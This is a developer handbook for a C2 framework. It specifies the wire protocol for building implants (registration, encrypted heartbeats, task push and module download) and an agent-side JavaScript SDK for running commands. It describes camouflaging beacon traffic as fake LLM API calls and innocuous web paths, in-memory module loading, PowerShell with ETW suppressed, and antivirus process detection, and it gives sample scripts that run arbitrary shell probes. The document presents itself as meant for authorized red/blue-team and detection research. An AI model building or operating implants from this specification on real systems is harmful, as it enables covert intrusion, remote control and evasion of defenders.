# Libra Agent Development Handbook: Wire Protocol & Agent-side JavaScript SDK

> **Audience**: developers who build or port **another Agent (implant)** for
> Libra-Nextgen, or who write Agent-side JavaScript capabilities (`script`
> modules). Typical use: **authorized red/blue team exercises and blue-team
> detection research** — custom agent variants, realistic beacon traffic for
> NDR/EDR rule validation, probe modules that emulate attacker TTPs.
>
> **Authority**: this document reflects the **real implementation** in this
> repository. When behavior differs from the code, trust the code and update
> this document. Source mapping per section: [§6](#6-source-mapping).
>
> **Authorized use only**: this framework is an adversarial C2. Use it solely
> in **authorized** environments (own assets, contracted ranges, red/blue
> exercises). Blue-team research requires the same authorized, network-isolated
> targets.
>
> **中文版**: [Agent 开发手册](../agent-development.md)

---

## 1. Terms & Architecture

| Term | Meaning |
|---|---|
| Server / TeamServer | ASP.NET Core backend (default port 5270): registration, heartbeats, task dispatch, module serving |
| Agent | Implant. Reference implementation is Rust (`src/agent-rs/`): beacon-style comms, on-demand in-memory module loading |
| Console | Web console (React). Talks REST/WS to the Server only — never directly to Agents |
| Task | One instruction to an Agent (`commandType` / `command` / `arguments`) |
| Module | An Agent-side capability unit: `script` (JS/QuickJS) or `native` (Rust cdylib) |
| Session | Between one registration and the next: AES session key + opaque session token |

Only **Server ↔ Agent** is an implant channel:

- Agents have **no WebSocket**. Realtime delivery is **SSE**; WebSocket exists
  only for the Console (`/ws/console`). (`src/agent-rs/libra-comm/src/http.rs` is
  HTTP/SSE only.)
- After the handshake every request body is **AES-256-GCM** encrypted; URLs,
  paths and request shapes are camouflaged by the **Malleable Profile**
  (configurable entry path, path suffixes, UA pool, extra headers, obfuscated
  field names, padding).
- Modules are downloaded from the Server and executed **in memory** (both the
  `script` JS source and `native` cdylibs).

### 1.1 Lifecycle of one task

```text
Console/plugin/MCP ──(REST, JWT)──▶ Server creates Task
                                        │
          ┌─────────────────────────────┴──────────────────────────┐
          ▼                                                         ▼
  Heartbeat poll: POST hb ──▶ response pendingTask          SSE push: op:"task"
          │                                                         │
          └──────────────────────┬──────────────────────────────────┘
                                 ▼
                    Agent receives AgentTask (dedup by taskId)
                                 ▼
         resolve_task: commandType → module entry
         (module missing → op:"mod" download, in-memory load)
                                 ▼
                   module entry runs (input = UTF-8 JSON)
                                 ▼
                 Agent POST res with TaskResult{taskId, …}
```

---

## 2. Wire Protocol Specification (for "another Agent" implementers)

> Implement this contract and Libra-Server will onboard your Agent. Reference
> reading: `src/agent-rs/libra-comm/src/http.rs` (HTTP client),
> `src/agent-rs/libra-engine/src/engine.rs` + `engine/heartbeat.rs` (state
> machine), `src/agent-rs/libra-crypto/src/lib.rs` (crypto).

### 2.1 Channels & path camouflage

`BeaconEntryMiddleware`
(`src/LibraNextgen.Server/Middleware/BeaconEntryMiddleware.cs`) rewrites
innocuous-looking public paths to the real beacon controllers:

| Public shape (what the Agent actually calls) | Internal rewrite | Purpose |
|---|---|---|
| `POST {server}/{entryPath}[/{suffix}]` (e.g. `/api/user/info`) | `/api/beacon/handle` | Malleable envelope entry (legacy envelope channel) |
| `POST {server}/{aiPath}` (default `/v1/chat/completions`) | `/api/beacon/ai` | **Fake-LLM-API channel**: heartbeats/results/module downloads |
| `GET  {server}/api/v1/models/events` | `/api/beacon/events` | **SSE event stream**: task push |
| `/api/beacon/*` | passthrough | Real controllers (register, core-key, …) |

- `entryPath` defaults to `/api`; default `pathSuffixes` include `user/info`,
  `orders/list`, `profile`, `settings`, `notifications`, `messages/unread`
  (the agent picks one at random and appends it).
- These camouflage parameters (AI path/models/auth prefix included) come from
  the **`profile` object in the registration response**; requests before
  registration use fixed paths.

### 2.2 Crypto contract (both sides must match)

- **AES-256-GCM**, wire layout is exactly `nonce(12B) ‖ tag(16B) ‖ ciphertext`,
  base64-encoded. Implementation pair: C# `CryptoHelper`
  (`src/LibraNextgen.Common/Protocol/CryptoHelper.cs`) ↔ Rust
  `libra_crypto::encrypt_payload/decrypt_payload` (`libra-crypto/src/lib.rs`).
- **RSA-2048 / RSA-OAEP-SHA256**; public keys travel as **SPKI DER** base64
  (not PKCS#1).
- **Pre-session key** = `SHA-256(beacon_secret)` (32B). The secret is embedded
  at build time and configured on the server, so both sides derive the same key
  without exchange; it encrypts the first registration handshake only.
- **Session key**: the Server generates a random 32B AES key at registration,
  OAEP-encrypts it with the Agent's **ephemeral RSA public key** sent in the
  registration, and returns it in `session_key`. All subsequent session traffic
  uses it.

### 2.3 Registration handshake

The Agent generates an ephemeral RSA-2048 keypair, collects
`hostname / userName / osVersion / arch / processName / pid / isElevated /
publicKey / hardware`, and registers via one of three modes (request fields are
camelCase):

**Mode A — loader / hybrid envelope (build-injected `server_public_key`, the
recommended new path)**

```http
POST {server}/api/v1/session
Content-Type: application/json

{ "grant_type": "client_credentials",
  "client_id":   "<AES-GCM(register JSON), random AES key>",
  "client_secret":"<RSA-OAEP(that AES key), server_public_key>" }
```

Server-side `ServerKeyService.OpenEnvelope(client_secret, client_id)` recovers
the plaintext register JSON (Rust side `libra_crypto::hybrid_encrypt` yields
`(enc_key, cipher_body)` → `client_secret` / `client_id`).

**Mode B — plaintext registration without a beacon secret (default register
path)**

```http
POST {server}/api/beacon/register
Content-Type: application/json

{ "hostname":"…","userName":"…","osVersion":"…","arch":"…",
  "publicKey":"<SPKI DER b64>","beaconSecret":"","hardware":{…},"hasSessionKey":false }
```

This endpoint also accepts `{"payload": "<AES-GCM(pre-session key, register JSON)>"}`.

**Mode C — malleable envelope with a beacon secret**

Encrypt the whole `{"op":"reg","id":"","data":"<register JSON>"}` with the
pre-session key, wrap it per §2.4, and POST it to the profile entry path
(rewritten to `/api/beacon/handle`, op `reg`).

**Registration response** (plaintext in all modes; `session_key` is already
RSA-OAEP-protected, so an on-path observer cannot decrypt it):

```jsonc
{
  "agent_id": "…",                 // persisted Server agent id
  "session_key": "<RSA-OAEP(AES-256 session key) b64>",   // empty when hasSessionKey=true
  "session_token": "<opaque session token>",              // on-wire identity; rotates per registration
  "ws_url": "ws://…/ws/chat",      // Console-only, Agent ignores
  "heartbeat_interval_ms": 60000,
  "jitter_percent": 0.2,
  "profile": { /* ProfileTransform, below */ }
}
```

`profile` fields (agent model `libra_common::models::ProfileTransform`):

| Field | Meaning |
|---|---|
| `entryPath` / `pathSuffixes` | envelope entry path and random suffix pool |
| `dataKey` / `tsKey` / `randKey` / `signKey` / `tokenKey` | outer envelope field-name obfuscation (defaults `d`/`ts`/`r`/`sign`/`sid`) |
| `userAgents` | UA rotation pool (empty → default UA) |
| `extraHeaders` | extra request headers as `"Header: value"` strings |
| `paddingMin` / `paddingMax` | range of trailing `\n` padding appended before encryption |
| `heartbeatIntervalMs` / `jitterPercent` | heartbeat tuning (may override the top-level fields) |
| `aiPath` / `aiModels` / `authPrefix` | fake-AI path, model list, Bearer prefix |

### 2.4 Session opcodes

All post-session traffic encrypts the same envelope structure (registration too):

```jsonc
{ "op": "reg" | "hb" | "res" | "mod",
  "id": "<session_token>",
  "data": "<JSON string>" }
```

| op | `data` content | Direction | Notes |
|---|---|---|---|
| `reg` | register JSON | → | only on Mode C entry envelopes |
| `hb` | `{"ts": <epoch ms>}` | → | heartbeat; server rejects if `ts` deviates >120 s from now (replay guard) |
| `res` | `TaskResult` JSON | → | task result; response `{"status":"received"}` |
| `mod` | `{"name": "<module>"}` | → | request a module; response = module artifact bytes (base64) |

### 2.5 Fake-AI channel (primary channel for hb / res / mod)

The reference agent's `post_ai` (`http.rs`) disguises every session request as an
OpenAI-style Chat Completions call:

```http
POST {server}/v1/chat/completions        # profile.aiPath
Content-Type: application/json
Authorization: Bearer sk-<96 hex>        # authPrefix + random hex, decorative only
User-Agent: <rotated from profile.userAgents>

{
  "model": "gpt-4o-mini",                # random from profile.aiModels
  "stream": true,
  "messages": [{ "role": "user",
                 "content": "data:image/jpeg;base64,<AES ciphertext>" }],
  "user": "<session_token>"              # server uses it to resolve session & AES key
}
```

`<AES ciphertext>` is the base64 AES-256-GCM encryption of the §2.4 envelope
JSON, after appending `paddingMin..paddingMax` trailing newlines.

Server side (`/api/beacon/ai` handler):

1. Take `messages[0].content`, strip the `data:image/jpeg;base64,` prefix → ciphertext;
2. Resolve the agent + session key from `user` (= session token) and decrypt;
3. Process the op, then AES-encrypt the response plaintext, split into ≤60 KB
   chunks, and return them as an SSE stream of `chat.completion.chunk` frames:

```text
data: {"id":"chatcmpl-…","obj":"chat.completion.chunk","created":…,
       "model":"gpt-4o-mini","choices":[{"index":0,"delta":{"content":"<cipher chunk>"},
       "finish_reason":null}]}

data: [DONE]
```

The agent concatenates all `delta.content` chunks and decrypts once.

> **Session-lost detection**: 401/404 on the AI or SSE channel means the session
> is gone (`SESSION_LOST`): drop the session key/token, back off and re-register
> (§2.8).

### 2.6 Heartbeat (poll for tasks)

The decrypted `hb` response is:

```jsonc
{ "status": "ok", "pendingTask": null }                       // no task
{ "status": "ok", "pendingTask": { /* AgentTask, §2.7 */ } }  // one pending task
```

- Interval/jitter follow the registration response: active profile default
  `heartbeatIntervalMs = 60000` (legacy fallback 10000). Jitter
  (`x86_style_jitter`, `libra-engine/src/config.rs`): with probability 1/12 the
  interval is stretched to 1.5–3×; otherwise randomized within
  ±`base*jitterPercent`; floor 500 ms.
- Heartbeat and SSE run concurrently and do not block each other. **A task may
  arrive either as heartbeat `pendingTask` or via SSE at any time**; the agent
  dedups by task id (in-memory set, cap 512).
- The SSE connection itself proves liveness: the server sends a keepalive
  (`: ping`) every 30 s and refreshes lastSeen.

### 2.7 AgentTask contract (all camelCase)

```jsonc
{
  "id": "…",                 // task id (dedup + result correlation)
  "agentId": "…",
  "createdBy": "…",
  "commandType": "Generic",  // enum, see table
  "command": "script",       // meaning depends on commandType
  "arguments": ["<JSON string>", …],
  "status": "Pending",       // Pending/Sent/Running/Completed/Failed/Cancelled
  "output": null, "error": null,
  "timeoutSeconds": 60
}
```

`resolve_task` (`libra-engine/src/engine/heartbeat.rs`) maps `commandType`:

| commandType | Behavior | Module |
|---|---|---|
| `Shell` | `command` is the command line | `shell` |
| `PowerShell` | `command` is the script; suppress ETW unless `arguments` contains `etwSuppress=false` | `powershell` |
| `LocalAccounts` | enumerate local accounts | `recon` |
| `Proxy` | `command` is the target URL | `proxy` |
| `FileList` / `FileDrives` | list directory / drives | `files` (drives via platform executor) |
| `Upload` / `Download` | `command`=path, `arguments[0]`=content | `files` |
| `Kill` | `command`=PID | `recon` |
| `Generic` | **generic module call**: `command`=module name; `arguments[0]`=JSON input; `isolated=true` in `arguments` → isolated execution (server appends it for `creds`) | any module (incl. `script`) |
| `Sleep` | placeholder `{"status":"sleeping"}` | — |
| `KillAndClean` | ack, remove persistence, exit | — (self-destruct) |
| `Restart` | ack, spawn own copy, exit | — |
| others (e.g. `WifiScan`) | placeholder `{"status":"ok","commandType":"…"}` | — |

### 2.8 Reconnect & lifecycle

```text
registered ──▶ [hb poll] ═╗
               [SSE]     ══╣──▶ task → dedup → resolve module → run → res
                            ▲
         401/404 (SESSION_LOST) │  on any channel error:
                                │   - 2 quick retries (1.5 s apart)
                                │   - then exponential backoff 5 s→10s→…→300 s
                                └──────▶ drop session → re-register
```

- Each SSE stream lives a random 300–900 s then rotates; reconnects every 3 s.
- The `run()` loop back-offs exponentially on any non-SESSION_LOST error;
  SESSION_LOST resets the backoff immediately.

### 2.9 Result submission

The agent wraps the module output first:

```jsonc
// success = (output JSON object has no "error" key && success != false)
{ "taskId": "<taskId>", "success": true,
  "output": "<raw module output string>", "error": null }
```

then submits it as the `res` op's `data` over the §2.5 channel. The server
persists it and wakes any waiter (plugin action gateway / MCP wait synchronously,
default 60 s; on timeout the pending task is cancelled).

### 2.10 Module download & ABI

- `op:"mod"` + `{"name":"shell"}` → response (base64-decoded) is the
  platform artifact `build-output/modules/{platform}/{name}.{dll|so}`
  (`linux*` → `.so`, otherwise `.dll`).
- Cloud module whitelist: `shell`, `recon`, `creds`, `files`, `powershell`,
  `proxy`, `script`.
- **The `script` module is itself a native cdylib** (the `modules/script`
  crate, exported name `script`); the JS source to run travels inside its
  *input* (see §3). Platform keys: `x64` / `x86` / `win-arm64` / `linux-x64` /
  `linux-arm64` / `mac-arm64`
  (`src/LibraNextgen.Server/Models/BuilderModels.cs::BuildPlatforms`).
  > Note: the win-arm64 template currently ships no `script` module (no
  > pre-generated rquickjs bindings for that target) — see
  > `docs/platform-support.md`.
- **ABI (same as native modules, `libra-load`)**:

```text
module_name() -> *const u8          // C string; must equal the requested name (self-check)
module_main(input: *const u8, input_len: usize,
            output: *mut u8, output_cap: usize) -> usize   // bytes written
```

  Input/output are UTF-8 JSON; output cap 16 MB.
- Execution model: the `ModuleManager` downloads and loads **in memory** (no
  disk); execution runs on the blocking pool **without holding the module
  manager lock** (parallel tasks). Server-flagged `isolated=true` modules run in
  a **forked child** on Linux so a crash cannot kill the agent (Windows has no
  fork → in-process fallback).
- The agent self-checks downloaded artifacts: missing or mismatched
  `module_name` → refused.

### 2.11 Server beacon endpoints (internal, real paths)

| Method & path | Purpose |
|---|---|
| `POST /api/v1/session` | Mode A registration (OAuth-style hybrid envelope) |
| `POST /api/v1/auth/token` | loader: core decryption key + one-time download ticket |
| `GET /api/v1/models/{buildId}?t=<ticket>` | loader: core payload download |
| `POST /api/beacon/register` | Mode B registration (plaintext or `payload`-encrypted) |
| `POST /api/beacon/handle` | Mode C envelope (rewritten entry path; ops `reg/hb/res/mod`) |
| `POST /api/beacon/ai` | fake-AI channel (rewritten from `/v1/chat/completions`) |
| `GET /api/beacon/events` | SSE (rewritten from `/api/v1/models/events`; `X-Session-Token`) |
| `POST /api/beacon/heartbeat\|result\|module` | legacy envelope endpoints (header `X-Request-Id`=token or `X-Agent-Id`) |
| `POST /api/beacon/core-key` | loader core-key negotiation |
| `GET /api/beacon/artifact/{buildId}`、`/api/beacon/core/{buildId}` | build artifacts / core download |

> New agents should implement **Mode A registration + AI channel (hb/res/mod) +
> SSE (events)**, matching the reference Rust agent. Legacy endpoints remain for
> older builds.

### 2.12 Minimal checklist for "another Agent"

- [ ] Registration (§2.3) succeeds: `agent_id` + `session_token` + RSA-OAEP
      `session_key` (decrypt with your ephemeral RSA private key)
- [ ] Heartbeat (hb) returns `pendingTask`; interval/jitter from the response
- [ ] SSE (`X-Session-Token`) delivers `{"op":"task","data":AgentTask}` (decrypt)
- [ ] Task dedup + dispatch by `commandType`; for `Generic` build the module
      input from `arguments[0]` JSON
- [ ] On missing module: `mod` op download + `module_name` self-check
- [ ] Results wrapped per §2.9 and submitted via `res`
- [ ] 401/404 → drop session → backoff re-register
- [ ] All session ciphertext uses the same AES-256-GCM key with
      `nonce‖tag‖cipher` layout (verify against `libra-crypto` test vectors)

---

## 3. Agent-side JavaScript SDK (script modules)

> This is the authoritative API reference for **capability/plugin authors**.
> Package structure, `meta.json` contract and zip layout are covered in
> [`plugin-development.md`](plugin-development.md) ("Agent channels / script").
> Reference implementation: `src/agent-rs/modules/script/`.

### 3.1 What a script module is

- **No compilation**: the plugin's `module/xxx.js` is plain JS text that the
  Server places verbatim into the task input; the Agent executes it in an
  embedded **QuickJS (rquickjs) sandbox**, in memory.
- Task input (§2.7 `Generic` `arguments[0]`; auto-built by the server plugin
  gateway):

```jsonc
{ "script": "<JS source>",        // required
  "args":   { "op": "…", "…": "…" },   // object passed to the entry function
  "entry":  "main",               // entry function name, default "main"
  "features": [] }                // capability gating; callers currently pass []
```

- Module output (i.e. the `script` cdylib's `module_main` output):

```jsonc
{ "ok": true,  "result": <entry return value, JSON-serialized> }
{ "ok": false, "error": "<engine/script error message>" }
```

  This output string is shipped verbatim as `TaskResult.output` (§2.9).

### 3.2 Sandbox boundaries (hard constraints)

- Bare QuickJS: **no** `fetch` / `require` / `setTimeout` / `console` /
  `XMLHttpRequest`. Globals `eval`, `Function`, `gc`, `print` are deleted at
  engine init (`drop_globals`, `engine.rs`).
- Log via `log()` (goes to the agent log with a `[script]` prefix).
- Platform branching is done at **runtime** with `__platform()`; platform APIs
  are registered only on their platform — calling them elsewhere throws
  "not a function".
- Host object prototypes are unreachable; JS cannot extend the sandbox itself.
- `env.set()` is a **deliberate no-op** (mutating the process environment in a
  multithreaded agent would be UB).

### 3.3 Entry function & value conversion

- The script must define a function (default name `main`) that receives the
  deserialized `args` object and returns a JSON-serializable value. Missing
  entry:

```text
entry function 'main' not found (script must define `function main`)
```

- JS → JSON (`js_to_json`): `undefined`/`null` → `null`; bool → bool; integral
  number → int64, else f64; string → string; arrays/objects recurse;
  functions/host objects/Symbols → `"<type>"` placeholder strings.
- JSON → JS builds values recursively with primitive constructors + Object/Array.

### 3.4 Full global API reference

#### Common (all platforms, `api_common.rs`)

| API | Signature | Returns / behavior |
|---|---|---|
| `fs.read(path)` | `fs.read("/etc/hosts")` | `string`; on failure a `"read error: …"` string (no exception) |
| `fs.write(path, content)` | | `boolean` |
| `fs.list(path)` | | `string[]` of entry names |
| `fs.exists(path)` | | `boolean` |
| `proc.list()` | | `[{ pid, name }]` (`tasklist /FO CSV /NH` on Windows, `ps -eo pid=,comm=` elsewhere) |
| `proc.kill(pid)` | | `boolean` (`taskkill /PID x /F` / `kill`) |
| `env.get(name)` | | `string` (empty when missing) |
| `env.set(name, value)` | | no return; **no-op** (§3.2) |
| `whoami()` | | `string` (`USERNAME` / `USER`) |
| `log(msg)` | | `void`; agent log |
| `__platform()` | | `"windows" \| "linux" \| "macos" \| "unknown"` |
| `exec.run(program, args, opts)` | `exec.run("/bin/sh", ["-c","echo $X"], {env:{X:"1"}, cwd:"/tmp", timeoutSeconds:30})` | blocks until exit (default timeout 30 s, kill on timeout): `{success, exitCode, stdout, stderr, timedOut}` |
| `exec.spawn(program, args, opts)` | | immediate `{success, pid}` (detached; only `env`/`cwd` of opts are used) |

`exec.run`/`exec.spawn` opts are optional: `{env: {k:v}, cwd: string,
timeoutSeconds: int}`. Child processes are isolated from the agent — crashes and
timeouts never take the agent down.

#### Windows-only (`api_windows.rs`; registered only when `__platform()==="windows"`)

| API | Signature | Behavior |
|---|---|---|
| `cmd(cmdline)` | `cmd("whoami")` | `cmd /C <cmdline>`, stdout (stderr fallback) |
| `powershell(script)` | | **in-process** PowerShell via `libra-psinline` (ETW suppressed by default), 60 s timeout |
| `reg_query(key, name)` | | `reg query <key> /v <name>` output |
| `reg_set(key, name, data)` | | `boolean` (`reg add /f`) |
| `reg_delete(key, name)` | | `boolean` (`reg delete /f`) |
| `ipconfig()` | | `ipconfig /all` output |
| `wmic(query)` | `wmic("process list brief")` | output string |
| `tasklist()` | | `tasklist /FO LIST` output |
| `__winapi_reserved()` | | registered only with `features: ["full"]`; placeholder (not wired) |

#### Linux / macOS-only (`api_linux.rs`; registered off-Windows)

| API | Signature | Behavior |
|---|---|---|
| `shell(cmdline)` | `shell("uname -a")` | `/bin/sh -c` output |
| `bash(script)` | | `/bin/bash -c` output |
| `uname()` | | `uname -a` |
| `ip_route()` | | `ip addr` (falls back to `ifconfig`) |
| `ss(path)` | `ss("/proc/cpuinfo")` | **reads a /proc or /sys text file** (not the `ss` network tool!) |
| `hostname()` | | `hostname` |
| `dns()` | | `cat /etc/resolv.conf` |
| `__syscall_reserved()` | | registered only with `features: ["full"]`; placeholder (not wired) |

> `features` is carried in the task input; the plugin gateway and MCP currently
> always send `[]`. Gating `"full"` only requires adding it to the task input —
> the registration logic is ready.

### 3.5 Writing guidelines

1. Return **JSON-serializable** values; express success as `{ok: true/false}`.
2. Branch on `args.op` when needed — the server injects `op` from
   `meta.json`'s `module.op`, merged with caller args.
3. **Mind the runtime budget**: the entry function blocks an agent execution
   thread. Use `exec.run` subprocesses with `timeoutSeconds` as a backstop so
   the server-side timeout does not fail the task.
4. Branch platforms with `__platform()`; never assume `cmd`/`shell` exist.
5. Log key steps with `log()` (lands in the agent log).
6. Watch the 16 MB module output cap and the Task timeout (gateway default 60 s).
7. Most file/command APIs return error strings instead of throwing — check
   `success` fields / prefixes.
8. Comments in code must be English (repo rule); keep the entry name aligned
   with `meta.json` `entry` (default `main`).

### 3.6 Examples

**Example 1 — hello / system info (cross-platform; from
`Libra-Plugin-Template/module/main.js`)**

```js
function main(args) {
    var op = args.op || "hello";
    if (op === "hello") {
        return { "message": "hello, " + (args.name || "world") + "!", "__platform": __platform() };
    }
    if (op === "system") {
        var info;
        if (__platform() === "windows") info = cmd("ver");
        else if (__platform() === "linux") info = uname();
        else info = "unsupported platform";
        return { "system": info };
    }
    return { "ok": true, "op": op };
}
```

**Example 2 — process enum + match (condensed from the real
`com.libra.av-list/module/main.js`)**

```js
var AV_MAP = { "msmpeng.exe": "Windows Defender", "avp.exe": "Kaspersky" /* … */ };

function main(args) {
    var procs = proc.list();          // [{pid, name}]
    var matched = [];
    for (var i = 0; i < procs.length; i++) {
        var key = (procs[i].name || "").toLowerCase();
        if (AV_MAP[key] !== undefined)
            matched.push({ name: procs[i].name, product: AV_MAP[key], pid: procs[i].pid });
    }
    return { ok: true, platform: __platform(), total_processes: procs.length, matched: matched };
}
```

**Example 3 — command execution with timeout (one-shot probes in lab research)**

```js
function main(args) {
    var probe = args.probe || "whoami";
    var argv = __platform() === "windows"
        ? ["cmd", ["/C", probe]]
        : ["/bin/sh", ["-c", probe]];
    var r = exec.run(argv[0], argv[1], { timeoutSeconds: 10 });
    if (!r.success) return { ok: false, error: r.stderr || "exit " + r.exitCode };
    return { ok: true, output: r.stdout };
}
```

More real scripts: installed runtime copy under
`src/plugins/com.libra.av-list/module/main.js` (runtime state, not in git) and
the template `Libra-Plugin-Template/module/main.js` (in git); plugin sources
live in the standalone
[Libra-Plugins](https://github.com/SmaZone2020/Libra-Plugins) repository.

### 3.7 Trigger paths (two)

1. **Plugin action gateway (recommended)**: Console page or MCP calls
   `POST /api/plugins/{pluginId}/{action}` with `{agentId, args}` → the Server
   reads `module/{name}.js`, assembles the §3.1 input from `meta.json` →
   `RelayService` creates a `Generic` task (`command:"script"`) and waits
   synchronously (default 60 s; on timeout returns 504 and cancels the task).
   meta declaration (corresponds to the §3.1 input):

```jsonc
"actions": [{
  "action": "detect",
  "module": { "kind": "script", "name": "main", "op": "detect", "entry": "main" }
}]
```

2. **Direct task creation** (debugging / no plugin; Console `POST /api/tasks`,
   JWT required):

```http
POST /api/tasks
Authorization: Bearer <console jwt>

{ "agentId": "…",
  "commandType": "Generic",
  "command": "script",
  "arguments": [ "{ \"script\": \"function main(a){return {pong:true};}\", \"args\": {}, \"entry\": \"main\", \"features\": [] }" ],
  "timeoutSeconds": 60 }
```

The completed task's `output` is a string containing the module's JSON:
`{"ok":true,"result":{…}}` (two nested layers: task wrapper + script-module
wrapper).

---

## 4. Blue-team research usage suggestions

Use this framework as a **programmable attack-behavior simulator** inside an
**authorized range**:

| Scenario | How | What to observe (for the blue team) |
|---|---|---|
| NDR/proxy-log rule validation | vary profiles (entry/suffix/UA/headers) and heartbeat cadence; compare EDR/NDR and ambient logs | camouflage drift, beacon-timing statistics |
| Host fingerprint & behavior modeling | script modules enumerate processes/network/accounts | baseline vs. simulator behavior |
| Detection false-positive tuning | run "clean-traffic" modules against malicious ones | SIEM rule hit rates |
| Variant porting | build a minimal Agent per §2.12 (e.g. Go/Python prototype) | check whether detection keys on one implementation's artifacts |

Ground rules:

- **Authorized targets only**, network-isolated (dedicated VLAN/range), never
  production or the open internet.
- Clean up quickly after simulated actions (a `KillAndClean` task removes
  persistence and exits).
- Archive results and traffic for after-action review; feed the blue team from
  the Server's audit log and task records.
- This document deliberately contains no evasion/AV-bypass material; focus on
  protocol behavior, detection validation, and defensive improvement.

---

## 5. Related documents

- Plugin development (three layers / meta.json / dual channels):
  [`plugin-development.md`](plugin-development.md) (mirrors
  [`../zh/plugin-development.md`](../zh/plugin-development.md))
- HTML plugin page SDK (`window.Libra`):
  [`../plugins/html-plugin-sdk.md`](../plugins/html-plugin-sdk.md)
- Platform build/runtime matrix: [`platform-support.md`](platform-support.md)
- Deployment (env vars/keys/nginx): [`deployment.md`](deployment.md)

---

## 6. Source mapping

> When maintaining this document, cross-check the code below before changing
> any protocol description; keep both in sync.

| Section | Implementation files (relative to repo root) |
|---|---|
| §2.1 path rewrite | `src/LibraNextgen.Server/Middleware/BeaconEntryMiddleware.cs` |
| §2.2 crypto | `src/LibraNextgen.Common/Protocol/CryptoHelper.cs`, `src/agent-rs/libra-crypto/src/lib.rs` |
| §2.3 registration | `src/LibraNextgen.Server/Controllers/V1BootstrapController.cs` (session), `AgentCommsController.cs` (register/handle), `src/agent-rs/libra-comm/src/http.rs` (register) |
| §2.4/§2.5 envelope & AI channel | `src/LibraNextgen.Server/Controllers/AgentCommsController.cs` (AiChannel), `src/agent-rs/libra-comm/src/http.rs` (post_ai/build_body) |
| §2.6 heartbeat / SSE | `AgentCommsController.cs` (Events), `src/agent-rs/libra-engine/src/engine.rs`, `engine/heartbeat.rs`, `libra-comm/src/http.rs` (open_events/heartbeat) |
| §2.7 task contract | `src/LibraNextgen.Common/Models/Task.cs`, `src/agent-rs/libra-common/src/models.rs`, `libra-engine/src/engine/heartbeat.rs` (resolve_task) |
| §2.8 reconnect | `src/agent-rs/libra-engine/src/engine.rs`, `config.rs` (x86_style_jitter) |
| §2.9 results | `heartbeat.rs` (wrap_result), `src/LibraNextgen.Server/Services/AgentCommsService.cs` (TaskResult) |
| §2.10 modules | `src/agent-rs/libra-engine/src/module_manager.rs`, `libra-load/src/lib.rs`, `src/LibraNextgen.Server/Services/BuilderBuildService.cs` (CloudModules) |
| §3 JS SDK | `src/agent-rs/modules/script/src/engine.rs`, `api_common.rs`, `api_windows.rs`, `api_linux.rs`, `lib.rs` |
| §3.7 trigger path | `src/LibraNextgen.Server/Controllers/PluginActionController.cs`, `Services/RelayService.cs`, `Services/PluginService.cs`, `Mcp/PluginTools.cs` |
